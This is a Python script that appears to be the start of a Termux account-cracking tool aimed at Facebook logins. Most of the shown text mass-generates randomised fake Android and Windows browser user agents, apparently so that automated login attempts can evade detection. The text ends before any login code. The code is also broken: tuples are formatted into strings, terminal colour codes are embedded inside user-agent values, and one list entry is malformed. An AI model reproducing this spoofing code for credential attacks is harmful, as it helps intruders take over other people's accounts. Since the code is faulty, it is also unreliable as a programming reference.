import os
import datetime
from bs4 import BeautifulSoup
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from concurrent.futures import ThreadPoolExecutor as ThreadPool 
import uuid,base64,hashlib,zlib,subprocess,time,platform,_socket,ssl,certifi
import bs4,json,sys,time,random,re,subprocess,platform,struct,string,uuid,base64,zlib
from concurrent.futures import ThreadPoolExecutor as tred
from concurrent.futures import ThreadPoolExecutor as ThreadPool
os.system('pkg install espeak')

loop,count,oks,cps,twf,usragent,ugen,okhbros,uas=0,0,[],[],[],[],[],[],[]

y="\x1b[38;5;208m";g="\x1b[38;5;46m";s="\33[38;5;37m";r="\33[38;5;160m";w="\033[1;97m"



import requests,random
gt = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550   5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
for xd in range(10000):
        aa='Mozilla/5.0 (Linux; U; Android'
        b=random.choice(['6','7','8','9','10','11','12','13'])
        c=f' TL-tl; {str(gt)}'
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/537.36'
        uaku2=f'{aa} {b}; {c}) \x1b[38;5;46m{h}.{i}.{j}.{k} {l}'
        ugen.append(uaku2)
def windows():
    aV=str(random.choice(range(10,20)))
    A=f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5,7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8,12)))}.0.{str(random.choice(range(552,661)))}.0 Safari/534.{aV}"
    bV=str(random.choice(range(1,36)))
    bx=str(random.choice(range(34,38)))
    bz=f"5{bx}.{bV}"
    B=f"Mozilla/5.0 (Windows NT {str(random.choice(range(5,7)))}.{str(random.choice(['2','1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12,42)))}.0.{str(random.choice(range(742,2200)))}.{str(random.choice(range(1,120)))} Safari/{bz}"
    cV=str(random.choice(range(1,36)))
    cx=str(random.choice(range(34,38)))
    cz=f"5{cx}.{cV}"
    C=f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2','1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12,42)))}.0.{str(random.choice(range(742,2200)))}.{str(random.choice(range(1,120)))} Safari/{cz}"
    D=f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1,7120)))}.0 Safari/537.36"
    return random.choice([A,B,C,D])
for agenku in range(10000):
  a='Mozilla/5.0 (Linux; Android'
  b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
  c=random.choice(['M2101K6G'])
  d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  e=random.randrange(1, 999)
  f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
  h=random.randrange(80,103)
  i='0'
  j=random.randrange(4200,4900)
  k=random.randrange(40,150)
  l='Mobile Safari/537.36'
  uakuh=f'{a} {b}; {c}{d}{e}{f}) \x1b[38;5;46m{h}.{i}.{j}.{k} {l}'
  ugen.append(uakuh)
for ua in range(10000):
      a='Mozilla/5.0 (Linux; Android'
      b=random.choice(['5.1.1' , '6.0.1' , '7.1.1' , '12' , '13' , '14' , '15'])
      y=random.choice(['SM-J320H' , 'SM-J3109' , 'J320FN' , 'SM-J320P' , 'SM-J320F' , 'SM-J320G' , 'SM-J320Y'])
      c='Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
      d=random.randrange(40,115)
      e='0'
      f=random.randrange(3000,6000)
      g=random.randrange(20,100)
      h='Mobile Safari/537.36'
      aalhaj=(f"{a} {b}; {y} {c}{d}.{e}.{f}.{g} {h}")
      ugen.append(aalhaj)
for ua in range(5000):
      a='Mozilla/5.0 (Linux; Android'
      b=random.choice(['5.1.1','6.0.1','7.1.1','11','12','13','14','15'])
      y=random.choice(['SM-J320H','SM-J3109','J320FN','SM-J320P','SM-J320F','SM-J320G','SM-J320Y'])
      c='Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
      d=random.randrange(40,115)
      e='0'
      f=random.randrange(3000,6000)
      g=random.randrange(20,100)
      h='Mobile Safari/537.36'
      alhajb=(f"{a} {b}; {y} {c}{d}.{e}.{f}.{g} {h}")
      ugen.append(alhajb)
for ua in range(5000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['8','9','10','11','12','13','14','15'])
	y=random.choice(['RMX3571','RMX3511','RMX3461','RMX3741','RMP2107','RMX3572','RMX1921','RMX3121','RMX3121','RMX3350','RMX3511'])
	c='Build/TQ1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=random.randrange(40,115)
	e='0'
	f=random.randrange(3000,6000)
	g=random.randrange(20,100)
	h='Mobile Safari/537.36'
	alhajc=(f"{a} {b}; {y} {c}{d}.{e}.{f}.{g} {h}")
	ugen.append(alhajc)
for ua in range(5000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5','6','7','8','9','10','11','12','13','14','15'])
	xs='TECNO'
	nx=random.choice(['CE8','KG5p','IN6','IN2','CE9','IN1','BD4h','K8','CE7','A571LS','BE8','BD4j','BD3','L6502S','RC6'])
	c=f'Build/TQ1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=random.randrange(40,115)
	e='0'
	f=random.randrange(3000,6000)
	g=random.randrange(20,150)
	h='Mobile Safari/537.36'
	alhajj=(f"{a} {b}; {xs} {nx} {c}{d}.{e}.{f}.{g} {h}")
	ugen.append(alhajj)
def ua():
    ver = str(random.choice(range(77, 500)))
    ver2 = str(random.choice(range(57, 77)))
    return f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver}.0.0.{ver2} Safari/537.36"
for xd in range(10000):  
  a='Mozilla/5.0 (Linux; Android'
  b=random.choice(['8.1.0','9','10','11','12','13'])
  c='SM-G960N Build/QP1A.190711.020; wv)'
  d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
  e=random.randrange(73,100)
  f='0'
  g=random.randrange(4200,4900)
  h=random.randrange(40,150)
  i='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/399.0.0.24.93;]'
  uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
  ugen.append(uakuh)
for xd in range(10000): 
  aa='Mozilla/5.0 (Linux; Android'
  b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
  c=random.choice(['SM-J610F'])
  d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  e=random.randrange(80,106)
  f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
  h=random.randrange(80,103)
  i='0'
  j=random.randrange(4200,4900)
  k=random.randrange(40,150)
  l='Mobile Safari/537.36'
  uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
  ugen.append(uakuh)
for xd in range(10000):   
  aa='Mozilla/5.0 (Linux; U; Android'
  b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
  c=random.choice(['LE2113'])
  d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  e=random.randrange(1, 999)
  f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
  h=random.randrange(80,103)
  i='0'
  j=random.randrange(4200,4900)
  k=random.randrange(40,150)
  l='Mobile Safari/537.36'
  uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
  ugen.append(uakuh)
for xd in range(10000): 
  aa='Mozilla/5.0 (Linux; U; Android'
  b=random.choice(['6','7','8','9','10','11','12'])
  c=(['en-us; RMX1925 Build/QKQ1.200209.002)'])
  d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  e=random.randrange(1, 999)
  f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
  h=random.randrange(73,100)
  i='0'
  j=random.randrange(4200,4900)
  k=random.randrange(40,150)
  l='Mobile Safari/537.36 HeyTapBrowser/45.7.0.0'
  uakuh=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
  ugen.append(uakuh)
for xd in range(5000):   
   aa='Mozilla/5.0 (Linux; U; Android','Mozilla/5.0 (Linux; U; Android','Mozilla/5.0 (Linux; Android 6.0.1;','Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36',
   b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
   c=' en-us; GT-','Mozilla/5.0 (Linux; Android 12; Pixel 6 Build/SD1A.210817.023; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.71 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 6.0.1; SM-G935S Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36'
   d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   e=random.randrange(1, 999)
   f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
   h=random.randrange(73,100)
   i='0'
   j=random.randrange(4200,4900)
   k=random.randrange(40,150)
   l='Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android','Mozilla/5.0 (Linux; Android 6.0.1;','Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36',
   uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
   ugen.append(uaku2)
for agent in range(10000):   
	aa='Mozilla/5.0 (Linux; Android 6.0.1;','Mozilla/5.0 (Linux; U; Android','Mozilla/5.0 (Linux; Android 6.0.1;','Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36',
	b=random.choice(['6','7','8','9','10','11','12'])
	c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android','Mozilla/5.0 (Linux; Android 6.0.1;','Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36',
	fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	ugen.append(fullagnt)

for xd in range(10000):
   a='Mozilla/5.0 (Symbian/3; Series60/','Mozilla/5.0 (Linux; U; Android','Mozilla/5.0 (Linux; Android 6.0.1;','Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36',
   b=random.randrange(1, 9)
   c=random.randrange(1, 9)
   d='Nokia','Mozilla/5.0 (Linux; Android 7.1.1; G8231 Build/41.2.A.0.219; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; Google Pixel 4 Build/QD1A.190821.014.C2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 Mobile Safari/537.36'
   e=random.randrange(100, 9999)
   #f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
   g=random.randrange(1, 9)
   h=random.randrange(1, 4)
   i=random.randrange(1, 4)
   j=random.randrange(1, 4)
   k='Mobile Safari/535.1','Mozilla/5.0 (Linux; U; Android','Mozilla/5.0 (Linux; Android 6.0.1;','Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36',
   uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
   ugen.append(uaku)

   aa='Mozilla/5.0 (Linux; U; Android','Mozilla/5.0 (Linux; U; Android','Mozilla/5.0 (Linux; Android 6.0.1;','Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36',
   b=random.choice(['6','7','8','9','10','11','12'])
   c=' en-us; GT-'
   d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   e=random.randrange(1, 999)
   f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
   g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
   h=random.randrange(73,100)
   i='0'
   j=random.randrange(4200,4900)
   k=random.randrange(40,150)
   l='Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android','Mozilla/5.0 (Linux; Android 6.0.1;','Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36',
   uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
   ugen.append(uaku2)

for agenku in range(10000):
  a='Mozilla/5.0 (Linux; Android'
  b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
  c=random.choice(['M2006C3MII'])
  d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  e=random.randrange(1, 999)
  f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
  g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
  h=random.randrange(80,103)
  i='0'
  j=random.randrange(4200,4900)
  k=random.randrange(40,150)
  l='Mobile Safari/537.36'
  uakuh=f'{a} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
  ugen.append(uakuh)
for xd in range(10000):  
  a='Mozilla/5.0 (Linux; Android'
  b=random.choice(['8.1.0','9','10','11','12','13'])
  c='Redmi Note 9 Pro Build/QKQ1.191215.002; wv)'
  d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
  e=random.randrange(73,100)
  f='0'
  g=random.randrange(4200,4900)
  h=random.randrange(40,150)
  i='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/399.0.0.24.93;]'
  uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
  ugen.append(uakuh)
for xd in range(10000): 
  aa='Mozilla/5.0 (Linux; U; Android'
